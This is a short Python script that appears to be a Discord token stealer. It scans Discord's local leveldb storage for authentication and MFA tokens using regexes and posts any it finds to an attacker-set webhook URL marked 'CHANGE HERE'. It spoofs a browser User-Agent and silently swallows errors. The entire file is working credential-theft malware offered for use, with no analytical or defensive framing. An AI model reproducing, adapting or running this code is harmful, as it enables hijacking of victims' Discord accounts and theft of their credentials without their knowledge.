import os
import re
import json
from urllib.request import Request, urlopen

WEBHOOK_URL = ""    #CHANGE HERE

def find_tokens():
    roaming = os.getenv('APPDATA')
    path = roaming + '\\Discord' + '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if file_name.endswith('.log') or file_name.endswith('.ldb'):   
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)

    my_message = "@everyone \n"
    if len(tokens) > 0:
        for token in tokens:
            my_message += token + "\n"
        return my_message
    else:
        return "No tokens found."

def main():
    headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': find_tokens()})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()